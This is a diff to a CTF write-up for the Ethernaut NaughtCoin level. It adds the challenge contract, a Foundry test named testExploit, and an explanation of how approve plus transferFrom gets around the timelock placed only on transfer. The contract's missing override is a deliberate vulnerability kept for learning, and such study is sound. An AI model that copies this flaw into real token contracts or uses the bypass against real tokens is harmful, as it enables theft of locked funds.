@@ -777,10 +777,70 @@ Link: https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8
 ### Contracts
 - `src/Week8-9/Ethernaut_NaughtCoin.sol`
 ```
+contract NaughtCoin is ERC20 {
+    // string public constant name = 'NaughtCoin';
+    // string public constant symbol = '0x0';
+    // uint public constant decimals = 18;
+    uint256 public timeLock = block.timestamp + 10 * 365 days;
+    uint256 public INITIAL_SUPPLY;
+    address public player;
+
+    constructor(address _player) ERC20("NaughtCoin", "0x0") {
+        player = _player;
+        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
+        // _totalSupply = INITIAL_SUPPLY;
+        // _balances[player] = INITIAL_SUPPLY;
+        _mint(player, INITIAL_SUPPLY);
+        emit Transfer(address(0), player, INITIAL_SUPPLY);
+    }
+
+    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
+        super.transfer(_to, _value);
+    }
+
+    // Prevent the initial owner from transferring tokens until the timelock has passed
+    modifier lockTokens() {
+        if (msg.sender == player) {
+            require(block.timestamp > timeLock);
+            _;
+        } else {
+            _;
+        }
+    }
+}
 ```
 - `test/Week8-9/Ethernaur_NaughtCoin.t.sol`
+```
+contract NaughtCoinTest is Test {
+    NaughtCoin naughtCoin;
+    address player = address(this);
+    address attacker = address(0xBad);
+
+    function setUp() public {
+        //player starts with 1_000_000 tokens with 10 year transfer lockout
+        naughtCoin = new NaughtCoin(player);
+    }
+
+    function testExploit() public {
+        vm.startPrank(player);
+        naughtCoin.approve(attacker, 1000000 * 10 ** 18); // 1_000_000
+        vm.stopPrank();
+
+        vm.startPrank(attacker);
+        naughtCoin.transferFrom(player, attacker, 1000000 * 10 ** 18); // 1_000_000
+        vm.stopPrank();
+
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertTrue(naughtCoin.balanceOf(player) == 0, "Challenge Incomplete");
+    }
+}
+```
 
 ### Exploit
+To complete this ctf, the token balance for `player` needs to be 0. The `NaughtCoin` contract implements ERC20 and overrides `transfer` with a timelock of 10 years for `player`, so `player` cant send tokens through the `transfer` function. However, the contract does not override ERC20's `transferFrom` function. So we can approve a spending allowance for `attacker`, and `attacker` can simply call `transferFrom` to transfer out `player`'s full token balance.
 
 ## Ethernaut: #20 Denial
 Link: https://ethernaut.openzeppelin.com/level/0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6
